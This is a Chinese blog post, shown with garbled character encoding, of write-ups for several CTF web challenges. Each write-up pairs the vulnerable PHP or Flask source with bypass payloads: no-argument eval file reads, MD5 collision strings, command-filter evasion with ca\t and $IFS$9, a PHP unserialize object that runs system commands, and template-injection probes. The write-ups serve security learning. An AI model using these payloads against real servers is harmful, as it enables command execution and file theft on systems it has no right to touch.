---
layout:    post
title:     CTF2
subtitle:  å­¦ä¹ å­¦ä¹ 
date:      2021-05-30
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:

   - CTF
---

> å…¨å†™åœ¨ä¸€ä¸ªé‡Œå¤ªå¤šï¼Œåˆ†å¼€æ”¾ã€‚

### [BJDCTF2020]Mark loves cat

1.è¿›å…¥åï¼Œå‘ç°æ‰€æœ‰çš„é“¾æ¥éƒ½æŒ‡å‘äº†è‡ªå·±ã€‚

2.æ‰«æç›®å½•ï¼Œç”¨ dirsearch å°±è¡Œã€‚

[![2ZmUbV.png](https://z3.ax1x.com/2021/05/30/2ZmUbV.png)](https://imgtu.com/i/2ZmUbV)

å¾—åˆ°å­˜åœ¨ .git æºç æ³„éœ²ã€‚

3.ç”¨ GitHack æŠŠä»£ç ä¸‹è½½ä¸‹æ¥ã€‚



[https://blog.csdn.net/qq_43622442/article/details/105925473](https://blog.csdn.net/qq_43622442/article/details/105925473)

### [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ

æ‰«æä¸€ä¸‹ï¼Œå¾—åˆ°æ–‡ä»¶ ``index.php.bak`` ã€‚è¿›è¡Œå®¡è®¡ï¼š

```
<?php                                                                                          
include "flag.php";                                                                            
echo "flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>";                                                                     
if(isset($_GET['exp'])){                                                                       
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {            
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {                  
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {           
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("è¿˜å·®ä¸€ç‚¹å“¦ï¼");
            }
        }
        else{
            die("å†å¥½å¥½æƒ³æƒ³ï¼");
        }
    }
    else{
        die("è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼");
    }
}
// highlight_file(__FILE__);
?>
```

å…¶ä¸­ï¼šå…ˆå¯¹å¸¸ç”¨çš„ä¼ªåè®®è¿›è¡Œäº†æ£€æµ‹ï¼Œä¹‹ååˆè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œ

```
preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
```

è¿™é‡Œä½¿ç”¨``preg_replace``æ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ``[^A-Za-z0-9]``ï¼Œç„¶å``(?R)?``è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚

ä¸¾ä¸ªä¾‹å­ï¼š

a(b(c()));å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯a('b')æˆ–a('b', 'c')çš„è¿™ç§å«æœ‰å‚æ•°çš„éƒ½ä¸èƒ½ä½¿ç”¨ã€‚

æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚

payloadï¼š

```
print_r(scandir(current(localeconv())));
print_r(next(array_reverse(scandir(current(localeconv())))));
show_source(next(array_reverse(scandir(current(localeconv())))));
 or readfile(next(array_reverse(scandir(current(localeconv())))));
 or highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

### newsctf å‡›å†¬å°†è‡³

#### EasyWeb

æ‰“å¼€åï¼Œå¾—åˆ°ä»£ç ï¼Œè¿›è¡Œå®¡è®¡ï¼š å…³é”®ä»£ç  ğŸ‘‡

```php
<body>
        <h1>EasyWeb</h1>
        <div class="content">
            <?php highlight_file("index.php") ?>
        </div>
        <div class="content">
        <?php
            $six_number = $_POST['webp'];
            $a = $_POST['a'];
            $b = $_POST['b'];
            $c = $_POST['c'];
            if (md5($six_number) == 'e10adc3949ba59abbe56e057f20f883e' && md5($a) === md5($b) && $a !== $b) {
                if($array[++$c]=1){
                    if($array[]=1){
                        echo "nonono";
                    }
                    else{
                        require_once 'flag.php';
                        echo $flag;
                    }
                }
            } 
        ?>
        </div>
    </body> 
```

å‰é¢å¾ˆç®€å•ï¼Œè¯´ä¸€ä¸‹è¿™ä¸ªï¼Œæˆ‘æ²¡è§è¿‡ï¼š

```
if($array[++$c]=1){
    if($array[]=1){
        echo "nonono";
    }
    else{
        require_once 'flag.php';
        echo $flag;
    }
```

è¿™ä¸ªç»•è¿‡æ˜¯é€šè¿‡æº¢å‡ºï¼Œè¦è®© ``$array[]`` åˆ°è¾¾æœ€å¤§é™åº¦ï¼Œå¥½è®©ç¬¬äºŒä¸ª ``if`` æ—¶æ— æ³•èµ‹å€¼ï¼Œä»è€Œç»•è¿‡åˆ° ``else``ã€‚

PHPæ•°ç»„Keyæº¢å‡ºï¼š

> é€šè¿‡PHPåˆ›å»ºå…³è”æ•°ç»„çš„æ—¶å€™ï¼Œé”®å€¼Keyå¦‚æœæ˜¯æ•°å€¼å‹(å¯é€šè¿‡is_numeric()åˆ¤æ–­)ï¼Œåˆ™ä¼šåœ¨intæœ‰æ•ˆèŒƒå›´å†…è¢«è‡ªåŠ¨è½¬æ¢ä¸ºintå‹ï¼Œå¦‚æœè¶…è¿‡intæœ‰æ•ˆèŒƒå›´å°±ä¼šæœ‰é—®é¢˜ï¼Œè¿™å°±æ¶‰åŠåˆ°æ•°ç»„é”®å€¼Keyä½œä¸ºintå‹æ—¶çš„æœ‰æ•ˆèŒƒå›´åˆ¤æ–­ã€‚
>
> PHPçš„intå‹æ•°æ®å–å€¼èŒƒå›´ï¼Œä¸æ“ä½œç³»ç»Ÿç›¸å…³ï¼Œ32ä½ç³»ç»Ÿä¸Šä¸º2çš„31æ¬¡æ–¹ï¼ŒåŠ-2147483648åˆ°2147483647ï¼Œ64ä½ç³»ç»Ÿä¸Šä¸º2çš„63æ¬¡æ–¹ï¼Œå³-9223372036854775808åˆ°9223372036854775807ã€‚

æˆ‘ä»¬è¯•éªŒä¸€ä¸‹ï¼š

[![2NtMuV.png](https://z3.ax1x.com/2021/06/05/2NtMuV.png)](https://imgtu.com/i/2NtMuV)

[![2NtQBT.png](https://z3.ax1x.com/2021/06/05/2NtQBT.png)](https://imgtu.com/i/2NtQBT)

æ‰€ä»¥æœ€ç»ˆ payloa dä¸ºï¼š

```
webp=123456&a[]=1&b[]=2&c=9223372036854775806
```

è¾“å…¥å¾—åˆ°çš„ä¸ºä¸€ä¸ªå¯†ç ã€‚

ç„¶åæç¤ºå›¾ç‰‡æœ‰é—®é¢˜ï¼Œå°†å›¾ç‰‡ä¸‹è½½åï¼Œç”¨ binwalk è§£æä¸€ä¸‹ï¼š

[![2NtIUg.png](https://z3.ax1x.com/2021/06/05/2NtIUg.png)](https://imgtu.com/i/2NtIUg)

å‘ç°å…¶ä¸­è¿˜æœ‰ zip æ–‡ä»¶ï¼Œå°†å…¶æå–å‡ºæ¥ã€‚è§£å‹ï¼Œç”¨åˆ°ä¹‹å‰å¾—åˆ°çš„å¯†ç ï¼Œå¾—åˆ° flagã€‚

```
#binwalk dd å‘½ä»¤åˆ†ç¦»æ–‡ä»¶
dd if=index.png of=a.zip skip=1522188 bs=1
if æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šä»æ–‡ä»¶å¼€å¤´è·³è¿‡ x ä¸ªå—åå¼€å§‹å¤åˆ¶ï¼Œ
bs è®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å†™ä¸º x å­—èŠ‚ã€‚

binwalk -e æ–‡ä»¶è·¯å¾„  #å¾—åˆ°åˆ†ç¦»åçš„æ–‡ä»¶ ç›´æ¥å‘½ä»¤ä¸éœ€è¦åƒä¸Šé¢ä¸€æ ·è‡ªå·±è§„å®šæ–‡ä»¶ä½ç½®
```

å…¶ä»–åˆ†è§£æ–¹æ³•ï¼š

[https://www.cnblogs.com/jiaxinguoguo/p/7351202.html](https://www.cnblogs.com/jiaxinguoguo/p/7351202.html)

[http://www.bugku.com/forum.php?mod=viewthread&tid=115&extra=page%3D1](http://www.bugku.com/forum.php?mod=viewthread&tid=115&extra=page%3D1)

### [å®‰æ´µæ¯ 2019]easy_web

è¿›å…¥é¡µé¢ï¼Œæ‚²ä¼¤æ°”æ¯æ‰‘é¢è€Œæ¥ã€‚

#### çŸ¥è¯†ç‚¹ï¼š

+ md5 å¼ºç±»å‹ç»•è¿‡ã€‚
+ ä»»æ„æ–‡ä»¶è¯»å–ã€‚
+ Linuxå‘½ä»¤æ‰§è¡Œç»•è¿‡ã€‚



åœ¨ URL å¤„ï¼Œå‘ç°ï¼š

```url
http://54fae4b4-a5d2-4e35-a60d-1b772ad8b996.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

``img=TXpVek5UTTFNbVUzTURabE5qYz0`` ï¼Œè¿™ä¸ªæ˜¯ base64 åŠ å¯†ï¼Œè¿›è¡Œè§£ç ï¼Œè§£ç ä¸¤æ¬¡åå¾—åˆ°ï¼š``3535352e706e67``ã€‚ç„¶åè¿™ä¸ªåˆåƒæ˜¯ 16è¿›åˆ¶åŠ å¯†çš„ï¼Œè§£å¯†ä¸€ä¸‹ï¼š``555.png``ï¼Œä¸€ä¸ªå›¾ç‰‡çš„åå­—ã€‚

ç„¶åç”¨ä¸Šé¢çš„è§£å¯†åæ¨ index.php ï¼šè½¬æ¢åå¾—åˆ°ï¼š

```
TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
```

è®¿é—®ï¼Œå¾—åˆ° base64 ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè§£ç ï¼š

[![2Ubg3D.png](https://z3.ax1x.com/2021/06/06/2Ubg3D.png)](https://imgtu.com/i/2Ubg3D)

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

å…³é”®ä»£ç ï¼š

```php
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
```

æœ‰ä¸€ä¸ªMD5å¼ºç»•è¿‡ï¼š

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

ç„¶åè¿˜æœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œè¿‡æ»¤ï¼š

```php
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
```

è™½ç„¶è¿‡æ»¤äº† ``ls`` ä½†æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ ``dir`` æ¥æŸ¥çœ‹ç›®å½•ï¼š

[![2aGT8s.png](https://z3.ax1x.com/2021/06/06/2aGT8s.png)](https://imgtu.com/i/2aGT8s)

æ²¡æœ‰å‘ç°flagï¼Œå»è®¿é—®æ ¹ç›®å½•ï¼Œè¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬ä½¿ç”¨ ``%20`` æ¥ç»•è¿‡:

[![2aGvaF.png](https://z3.ax1x.com/2021/06/06/2aGvaF.png)](https://imgtu.com/i/2aGvaF)

å‘ç°flagï¼Œä½†æ˜¯ cat è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ ``ca\t%20/flag`` æ¥ç»•è¿‡ã€‚

[![2aGHvq.png](https://z3.ax1x.com/2021/06/06/2aGHvq.png)](https://imgtu.com/i/2aGHvq)

``ca\t`` åé¢çš„ ``\t`` ä¼šæˆä¸º TAB è€Œç»•è¿‡ã€‚

è¿˜å¯ä»¥ä½¿ç”¨ ``sort`` å‘½ä»¤ï¼Œsort å°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ ASCII ç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†å®ƒä»¬æŒ‰å‡åºè¾“å‡ºã€‚

### [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb

#### çŸ¥è¯†ç‚¹

+ PHPå‡½æ•°çš„ä½¿ç”¨ã€‚
+ PHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–

#### è§£é¢˜

æ‰“å¼€ç½‘é¡µåï¼Œå‘ç°ç½‘é¡µæ¯éš”ä¸€æ®µæ—¶é—´ä¼šè‡ªåŠ¨åˆ·æ–°ä¸€ä¸‹ï¼Œä¸”ç½‘é¡µä¸Šæ˜¾ç¤ºä¸€æ®µ warningä¿¡æ¯ï¼Œå¹¶æç¤ºäº† data() å‡½æ•°ã€‚

æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼š

[![2aNgJg.png](https://z3.ax1x.com/2021/06/06/2aNgJg.png)](https://imgtu.com/i/2aNgJg)

è§‚å¯Ÿå‘ç°é¡µé¢ä¼šä¼ é€’ä¸¤ä¸ªå‚æ•°ï¼Œfun å’Œ pã€‚fun å¯¹åº”çš„å€¼ä¸º dataï¼Œp å¯¹åº”çš„å€¼ä¸ºä¸€ä¸²æ—¶é—´æ ¼å¼ï¼ŒçŒœæµ‹ç½‘é¡µä¼šå‘åç«¯ä¼ é€’å‡½æ•°ååŠå…¶å¯¹åº”çš„å‚æ•°ã€‚

> php data(format)ï¼šæ ¼å¼åŒ–æ—¥æœŸå’Œæ—¶é—´ï¼Œå¹¶è¿”å›æ ¼å¼åŒ–çš„æ—¥æœŸå­—ç¬¦ä¸²ã€‚

æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥è‡ªè¡Œä¿®æ”¹ func å’Œ p çš„å€¼ï¼Œçœ‹æ˜¯å¦èƒ½è·å¾—ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚è¿™é‡Œå¯ä»¥é‡‡ç”¨ file_get_contents æ¥è·å– index.php çš„æºç ã€‚ï¼š (æ²¡æœ‰æ‹¬å·å“ˆ)

[![2aN4Lq.png](https://z3.ax1x.com/2021/06/06/2aN4Lq.png)](https://imgtu.com/i/2aN4Lq)

å¾—åˆ°æºç ï¼š

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

å‡½æ•°è¯´æ˜ï¼š

**call_user_func()ï¼š**

[![2aUg76.png](https://z3.ax1x.com/2021/06/06/2aUg76.png)](https://imgtu.com/i/2aUg76)

**getteyp()ï¼š**é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è¿”å›ç±»å‹ã€‚

å…¶ä»–æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ã€‚

æ•´æ®µä»£ç çš„è¿è¡Œé€»è¾‘ä¸ºï¼šåˆ©ç”¨ func å’Œ p ä¼ å…¥çš„å‚æ•°ä¼ å…¥ gettime()ï¼Œåœ¨è¿™æœŸé—´å¯¹ä¼ å…¥çš„ func æ•°æ®è¿›è¡Œäº†éç©ºåˆ¤æ–­ï¼Œå¤§å°å†™çš„è½¬æ¢ï¼Œé»‘åå•çš„æ ¡éªŒï¼Œè€Œ gettime() çš„è¿è¡Œé€»è¾‘ä¸ºï¼šåˆ©ç”¨ call_user_func æ‰§è¡Œä¼ å…¥çš„å‡½æ•°ï¼Œå¹¶å°†æ‰§è¡Œç»“æœè¿”å›åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºã€‚

è¿˜å¯ä»¥çœ‹åˆ° Test ç±»æ˜¯ä¸€ä¸ªå°å°çš„åºåˆ—åŒ–æç¤ºï¼Œå®ƒå¹¶æ²¡æœ‰è¢«è°ƒç”¨ã€‚ä½†æ˜¯è¿™æç¤ºäº†æˆ‘ä»¬å¯ä»¥é‡‡ç”¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥ç»•è¿‡ä¹‹å‰çš„è¿‡æ»¤ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°† ``$func=unserialize()&$p=æˆ‘ä»¬è¦æ‰§è¡Œçš„è¯­å¥çš„åºåˆ—åŒ–``ã€‚å¼€å§‹æ„é€ ï¼š

```
<?php
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}

class Test {
    var $p = "ls";
    var $func = "system";
    
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}

$a = new Test();
echo serialize($a);
?>
```

å¾—åˆ°ï¼š

```
O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
```

åç«¯æ¥å—åˆ°è¿™ä¸¤ä¸ªå‚æ•°åï¼Œè°ƒç”¨ call_user_func å°†ä¸Šé¢çš„å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿˜åŸæˆä¸Šé¢çš„ä»£ç ã€‚è€Œä¸Šé¢çš„ä»£ç æ ¸å¿ƒåœ¨äºåˆ›å»ºä¸€ä¸ª Test() å¯¹è±¡ï¼Œå› ä¸ºåœ¨ __destruct() å‡½æ•°æ˜¯æ„é€ æ–¹æ³•ï¼Œåœ¨å¯¹è±¡é”€æ¯æ—¶ä¼šæ‰§è¡Œï¼Œæ ¹æ® Test ç±»ä¸­è®¾ç½®çš„å‡½æ•°åå’Œå‚æ•°å€¼å†æ‰§è¡Œä¸€æ¬¡ï¼Œå°±å¯ä»¥è·å¾—æˆ‘ä»¬æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚



ç„¶åä¿®æ”¹ $p çš„å€¼å³å¯é€æ­¥å¾—åˆ°flagï¼š

```
find / -name flag*
cat $(find / -name flag)
```

æœ€ç»ˆ payloadï¼š

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:24:"cat $(find / -name flag)";s:4:"func";s:6:"system";}
```

æˆ–ä½¿ç”¨ ``readfile``ç›´æ¥è¯»å–å¾—åˆ°è·¯å¾„çš„flagï¼š

[![2a64aj.png](https://z3.ax1x.com/2021/06/06/2a64aj.png)](https://imgtu.com/i/2a64aj)

### [BJDCTF2020]Cookie is so stable

**æ¨¡æ¿æ³¨å…¥é¢˜**

åœ¨ ``/flag.php`` æµ‹è¯•ï¼š

```
{{7*'7'}}
å¾—åˆ° 49 è¯´æ˜ä¸º Twigæ¨¡æ¿
```

å» ``hint.php``å¾—åˆ°æç¤ºï¼Œçœ‹åˆ°æç¤ºæ³¨æ„ cookieå¤„ã€‚

æŠ“åŒ…çœ‹çœ‹ï¼š



### [WUSTCTF2020]æœ´å®æ— å

è¿›å…¥åï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç„¶åæœ‰ bot å­—çœ¼ï¼Œåº”è¯¥æ˜¯æç¤ºçœ‹ ``robots.txt``ï¼Œæ‰€ä»¥å»çœ‹çœ‹ï¼Œå¾—åˆ°æç¤ºï¼š``\fAke_f1agggg.php``ï¼Œå»è®¿é—®ï¼Œè®¿é—®è¿›å…¥åæç¤ºä¸åœ¨è¿™é‡Œï¼Œå»ç½‘ç»œçœ‹çœ‹ï¼Œåœ¨å“åº”å¤´å¤„åˆå¾—åˆ°``/fl4g.php``ï¼Œè®¿é—®è¿›å…¥æ­£é¢˜ã€‚

ä¹±ç ï¼Œåœ¨ç«ç‹æµè§ˆå™¨çš„è¯åœ¨å·¥å…·æ ä¸­ æ–‡å­—ç¼–ç å¤„ä¿®æ”¹ä¸º **Unicode**å³å¯ã€‚

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.</br>";
    }else{
        die("é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜");
    }
}else{
    die("å»éæ´²å§");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.</br>";
   else
       die("æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²");
}else{
    die("å»éæ´²å§");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.</br>";
        system($get_flag);
    }else{
        die("å¿«åˆ°éæ´²äº†");
    }
}else{
    die("å»éæ´²å§");
}
?> 
```

**intval()ç»•è¿‡ï¼š** ``intval($num)<2020 && intval($num+1)>2021``ã€‚çŸ¥è¯†ç‚¹ -> **å¦‚æœ intval()å‡½æ•°å‚æ•°å¡«å…¥ç§‘å­¦è®¡æ•°æ³•çš„å­—ç¬¦ä¸²ï¼Œä¼šä»¥eå‰é¢çš„æ•°å­—ä½œä¸ºè¿”å›å€¼**ï¼Œè€Œå¯¹äº**ç§‘å­¦è®¡æ•°æ³•çš„å­—ç¬¦ä¸²+æ•°å­—**åˆ™ä¼šå°†ä¹‹å‰çš„å­—ç¬¦ä¸²ç±»å‹è½¬æ¢ä¸ºæ•°å­—å‹ã€‚

ä¾‹å¦‚ï¼š

```php
<?php
$num = "2e3";
echo intval($num)."\n"; //å¾—åˆ°2
echo intval($num + 1);  //å¾—åˆ°2001
?>
```

æ—¢ç„¶å¾—åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œå¼€å§‹å®è·µï¼Œæ„é€ ï¼š``?num='1e4'``ï¼Œ???å¤±è´¥äº†ã€‚

çŒœæµ‹å¯èƒ½æ˜¯ä¼ å…¥numå€¼åå°ä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ï¼Œç”±äºå¼€å¯äº†``error_reporting(0)``ï¼Œä¹Ÿçœ‹ä¸è§æŠ¥é”™ã€‚é‡æ–°æ„é€ ï¼š``?num=1e4``ï¼ŒæˆåŠŸè¶Šè¿‡ç¬¬ä¸€é‡éšœç¢ã€‚

ç¬¬äºŒå±‚å°±æ˜¯å¸¸è§çš„md5ç»•è¿‡ï¼Œè¦æ±‚``$md5 == md5($md5)``ï¼Œç›´æ¥æ„é€ ï¼š``?num=1e4&md5=0e215962017``ï¼ŒæˆåŠŸã€‚

ç¬¬ä¸‰å±‚ï¼Œè¦æ±‚è¾“å…¥çš„å‚æ•°ä¸­ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¸”ä¸èƒ½æœ‰catå¦è€…ä¼šæ›¿æ¢æ‰ï¼Œç„¶åå°±ä¼šå°†æˆ‘ä»¬çš„å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚

å…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆï¼Œ``?num=1e4&md5=0e215962017&get_flag=ls``

[![WZHJ7q.png](https://z3.ax1x.com/2021/07/14/WZHJ7q.png)](https://imgtu.com/i/WZHJ7q)

å¾ˆæ˜æ˜¾äº†ï¼Œå…¶ä»–çš„æˆ‘ä»¬éƒ½è®¿é—®è¿‡äº†ï¼Œå°±æ˜¯è¿™ä¸ªæœ€é•¿çš„æ–‡ä»¶ä¸ºæˆ‘ä»¬è¦è·å–çš„ã€‚

å–ä»£catçš„æœ‰å¾ˆå¤šï¼Œå¦‚ï¼š``tacï¼Œmoreï¼Œnlï¼Œsort......``ã€‚ç©ºæ ¼æˆ‘ä»¬ä¹Ÿæœ‰ä»£æ›¿çš„ï¼Œå¯ä»¥ç”¨``$IFS$9, ${IFS}, ``ä»£æ›¿ã€‚

æ‰€ä»¥æœ€ç»ˆpayloadä¸º ï¼š``?num=1e4&md5=0e215962017&get_flag=sort$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag``ã€‚

### [WesternCTF2018]shrine

è¿›å…¥åå¾—åˆ°ï¼š

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

æ¨¡æ¿æ³¨å…¥ç±»å‹ï¼Œé¦–å…ˆæµ‹è¯•``/shrine/{{3*'1'}}``ï¼Œè¿”å›ä¸‰ä¸ª1ï¼Œè¯´æ˜ä¸ºJinja2æ¨¡æ¿ã€‚

åˆ†ææºç ï¼š

```python
app.config['FLAG'] = os.environ.pop('FLAG')
```

æ³¨å†Œäº†ä¸€ä¸ªåä¸ºFLAGçš„configï¼Œåœ¨æ²¡æœ‰é»‘åå•è¿‡æ»¤çš„æƒ…å†µä¸‹,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨configï¼Œä¼ å…¥ ``{{config}}``ï¼Œæˆ–è€…ä½¿ç”¨selfä¼ å…¥ ``{{self.dict}}``ï¼Œå½“ç„¶è¿™é‡Œè¢«è¿‡æ»¤äº†è¿``()``ä¹Ÿè¢«è¿‡æ»¤ã€‚

```python
return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
```

å°†é»‘åå•ä¸­çš„å­—ç¬¦ä¸²éå†ä¸ºç©ºã€‚

